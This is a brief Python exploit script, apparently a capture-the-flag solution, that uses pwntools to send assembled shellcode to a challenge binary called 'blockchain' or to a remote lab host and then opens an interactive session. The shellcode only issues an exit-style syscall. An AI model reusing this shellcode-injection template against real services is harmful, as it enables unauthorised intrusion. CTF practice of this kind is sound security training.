#!/usr/bin/env python3
import pwn
import vpn_conf
import sys

HOST = vpn_conf.HOST
PORT = int(vpn_conf.BASE_PORT + 5)
EXE_FILENAME = "./blockchain"


def start():
    if sys.argv[1] == "remote":
        return pwn.remote(HOST, PORT)
    return pwn.process(EXE_FILENAME)


if __name__ == "__main__":
    io = start()
    shellcode = pwn.asm(
        """
    xor eax,eax
    inc eax
    nop

    int 0x80
    nop
    nop
    nop
    """,
        arch="amd64",
    )
    io.sendline(shellcode)
    io.interactive()
